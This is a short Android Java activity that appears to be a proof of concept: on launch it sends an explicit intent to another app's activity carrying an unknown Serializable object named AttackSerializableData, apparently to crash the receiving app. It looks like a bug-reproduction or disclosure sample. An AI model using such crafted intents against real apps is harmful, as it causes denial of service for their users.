package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

import java.io.Serializable;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent i = new Intent();
        i.setClassName("com.example.flutter_app", "com.example.flutter_app.MainActivity");
        i.putExtra("xxx", new AttackSerializableData());
        startActivity(i);
    }

    public static class AttackSerializableData implements Serializable {
        public AttackSerializableData() {
            super();
        }
    }
}
